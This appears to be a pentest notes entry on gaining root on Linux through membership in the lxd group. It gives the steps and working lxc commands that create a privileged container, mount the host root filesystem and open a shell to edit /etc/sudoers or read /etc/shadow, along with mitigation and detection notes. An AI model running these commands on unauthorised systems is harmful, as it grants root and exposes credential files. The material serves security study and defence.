---
topic: LXD — privilege escalation through group membership
tags: [linux, lxd, container, privesc, mount]
---

# LXD — privilege escalation through group membership

[🌐 Español](lxd-group.md) | **English**

## Concept

Membership in the `lxd` group is equivalent to root: a privileged container can be created, the host root mounted and `/etc/sudoers` modified or `/etc/shadow` read.

## When it applies

- A user in the `lxd` group or access to the LXD socket.
- Local images or the ability to import one.
- Privileged containers allowed.

## Procedure

1. Confirm `id` and access to `lxc`.
2. Import a minimal image if none exists.
3. Create a container with `security.privileged=true`.
4. Add a disk device for the host `/`.
5. Enter it and write to `/etc/sudoers`.

## Commands

```bash
id
lxc image list
lxc init <IMAGE> privesc -c security.privileged=true
lxc config device add privesc hostroot disk source=/ path=/mnt/root
lxc start privesc && lxc exec privesc -- /bin/sh
```

## Variants

- Mount the `/var/run/lxd.sock` from another container.
- Use `lxc file push` to write host files.
- Import an image from a local file.

## Limitations

- The user must be in the `lxd` group.
- LXD may need a running daemon.
- Some configurations block privileged containers.

## Mitigation

- Do not add regular users to the `lxd` group.
- Restrict privileged container creation.
- Audit the socket and images.

## Detection

- New containers with `security.privileged`.
- Host `/` mounts and writes to `/etc/sudoers`.

## References

- <https://linuxcontainers.org/lxd/>
- <https://attack.mitre.org/techniques/T1611/>
